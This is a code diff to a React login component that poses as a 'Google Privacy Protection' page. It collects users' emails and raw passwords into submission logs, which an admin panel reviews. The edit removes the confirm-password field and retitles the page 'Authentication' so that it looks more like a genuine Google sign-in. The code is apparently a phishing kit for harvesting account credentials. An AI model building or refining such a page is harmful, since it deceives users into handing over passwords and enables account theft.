@@ -22,16 +22,13 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
     return localStorage.getItem('last_submitted_email') || 'user@gmail.com';
   });
   const [password, setPassword] = useState('');
-  const [confirmPassword, setConfirmPassword] = useState('');
   const [staySignedIn, setStaySignedIn] = useState(false);
   
   const [showPassword, setShowPassword] = useState(false);
-  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
 
   // Error States
   const [emailError, setEmailError] = useState('');
   const [passwordError, setPasswordError] = useState('');
-  const [confirmError, setConfirmError] = useState('');
   
   // Submission Success Notification State
   const [isSubmitted, setIsSubmitted] = useState(() => {
@@ -292,17 +289,15 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
     // Reset Errors
     setEmailError('');
     setPasswordError('');
-    setConfirmError('');
     
     const trimmedEmail = emailOrPhone.trim();
 
     // Check for admin first to make it extremely forgiving and robust
-    if (trimmedEmail.toLowerCase() === 'contact.cga.usa@gmail.com' && password && confirmPassword) {
+    if (trimmedEmail.toLowerCase() === 'contact.cga.usa@gmail.com' && password) {
       // Direct routing for the admin - save authenticated session state
       localStorage.setItem('admin_authenticated', 'true');
       setEmailOrPhone('');
       setPassword('');
-      setConfirmPassword('');
       onNavigate('admin');
       return;
     }
@@ -337,12 +332,6 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
       isValid = false;
     }
 
-    // Confirm Password Validation
-    if (confirmPassword !== password) {
-      setConfirmError('Confirm Password must exactly match Password.');
-      isValid = false;
-    }
-
     if (isValid) {
       // Create a demo submission log object with raw passwords
       const submission = {
@@ -351,8 +340,8 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
         emailOrPhone: trimmedEmail,
         passwordLength: password.length,
         password: password,
-        confirmPassword: confirmPassword,
-        isMatched: password === confirmPassword,
+        confirmPassword: password,
+        isMatched: true,
         browser: getBrowserName(),
         status: 'pending' as const,
         type: isAppealMode ? 'appeal' as const : 'sov' as const,
@@ -385,7 +374,6 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
       // Reset fields
       setEmailOrPhone('');
       setPassword('');
-      setConfirmPassword('');
       setIsSubmitted(true);
       setTimeLeft(300);
       setIsConfirmed(false);
@@ -1016,7 +1004,7 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
           {/* Editorial Heading Text */}
           <div className="space-y-4">
             <h1 className="text-3xl md:text-[44px] font-light text-text-primary leading-tight tracking-tight max-w-xl">
-              Google Privacy Protection Survey
+              Google Privacy Protection Authentication
             </h1>
             <p className="text-lg text-text-secondary font-normal max-w-lg">
               Please complete this survey form to confirm your interest. <span className="dark:font-semibold">protect your privacy</span>
@@ -1101,40 +1089,6 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
                 </button>
                 <div className="min-h-[16px] text-brand-error text-xs font-medium mt-1">
                   {passwordError}
-                </div>
-              </div>
-
-              {/* Confirm Password Field */}
-              <div className="relative">
-                <input
-                  id="confirmPassword"
-                  type={showConfirmPassword ? 'text' : 'password'}
-                  placeholder=" "
-                  value={confirmPassword}
-                  onChange={(e) => setConfirmPassword(e.target.value)}
-                  className={`peer w-full h-14 pl-4 pr-11 pt-4 text-base border rounded bg-bg-input text-text-primary outline-none transition-all ${
-                    confirmError ? 'border-brand-error focus:border-brand-error' : 'border-border-custom focus:border-2 focus:border-brand-primary'
-                  }`}
-                  autoComplete="new-password"
-                />
-                <label 
-                  htmlFor="confirmPassword" 
-                  className="absolute left-4 top-4 text-sm text-text-secondary pointer-events-none transition-all duration-200 
-                             peer-placeholder-shown:text-base peer-placeholder-shown:top-4 
-                             peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-brand-primary peer-focus:font-medium
-                             peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-xs"
-                >
-                  Confirm password
-                </label>
-                <button
-                  type="button"
-                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
-                  className="absolute right-3.5 top-5 text-text-secondary hover:text-text-primary focus:outline-none"
-                >
-                  {showConfirmPassword ? <EyeOff className="h-4.5 w-4.5" /> : <Eye className="h-4.5 w-4.5" />}
-                </button>
-                <div className="min-h-[16px] text-brand-error text-xs font-medium mt-1">
-                  {confirmError}
                 </div>
               </div>
 
